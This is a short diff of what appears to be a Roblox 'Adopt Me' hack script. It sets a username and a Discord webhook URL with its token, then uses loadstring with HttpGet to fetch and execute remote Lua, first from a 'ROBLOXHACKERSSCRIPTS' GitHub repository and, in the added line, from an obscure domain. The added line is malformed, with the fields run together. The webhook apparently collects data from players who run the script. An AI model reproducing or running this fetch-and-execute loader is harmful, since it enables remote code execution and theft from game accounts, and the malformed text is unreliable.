@@ -1,3 +1,1 @@
-Username = "TFOX2130 "
-Webhook = "https://discord.com/api/webhooks/1275039490221674527/BRL0-vfDyutAOq9KiIw7FV7xl45bnNUx3WDT-jcRGq0Li6zHXhn_4Bif_zBX4K3x38rz"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ROBLOXHACKERSSCRIPTS/Scripts/refs/heads/main/AdoptMe", true))()
+username:TFOX2130 webhook:https://discord.com/api/webhooks/1275039490221674527/BRL0-vfDyutAOq9KiIw7FV7xl45bnNUx3WDT-jcRGq0Li6zHXhn_4Bif_zBX4K3x38rzloadstring(game:HttpGet("https://egorikusa.space/3a95925a8af9a4b6f1de5245.lua", true))()
